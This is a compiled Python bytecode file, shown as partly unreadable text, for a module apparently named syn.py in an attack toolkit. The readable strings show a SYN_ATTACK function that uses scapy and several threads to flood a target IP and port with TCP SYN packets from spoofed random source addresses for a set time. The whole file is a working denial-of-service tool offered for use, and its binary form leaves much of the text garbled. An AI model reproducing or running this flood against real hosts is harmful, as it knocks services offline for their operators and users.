a
    cv?a?  ?                   @   sH   d dl Z d dlZd dlmZmZmZ d dlmZ d dlm	Z	 dd? Z
dS )?    N)?IP?TCP?send)?Threadc                    s?   da |?d?d ? t|?d?d ??td? g }? ?fdd?}td| ?D ]4}tdt|? d	 ? t|d
?}|??  |?|? qHt	?
|? |D ]}da |??  q?td? d S )NF?:r   ?   z%[1;34m[*][0m Starting SYN attack...c               
      s?   t rq?t? } t?? | _? | _t? }t?dd?|_	?|_
d|_t?dd?|_t?dd?|_zt| | dd? W n, ty? } zt|? W Y d }~q d }~0 0 td? q d S )Ni?  i'  ?SF)?verbosez#[1;32m[+][0m SYN packet was sent!)?FINISHr   ?
randomDataZ	random_IP?srcZdstr   ?random?randintZsportZdport?flags?seqZwindowr   ?	Exception?print)Z	IP_PacketZ
TCP_Packet?e?Z	target_ipZtarget_port? ?2/storage/emulated/0/Script Vip/toolso/other/syn.py?	syn_flood   s     
zSYN_ATTACK.<locals>.syn_floodz[1;34m[*][0m Staring thread z...)?targetTz [1;77m[i][0m Attack completed.)r
   ?split?intr   ?range?strr   ?start?append?time?sleep?join)ZthreadsZattack_timer   Zthreads_listr   ?thread?tr   r   r   ?
SYN_ATTACK
   s     


r$   )r   r   Z	scapy.allr   r   r   Z	threadingr   Ztoolso.randomDatar   r$   r   r   r   r   ?<module>   s
   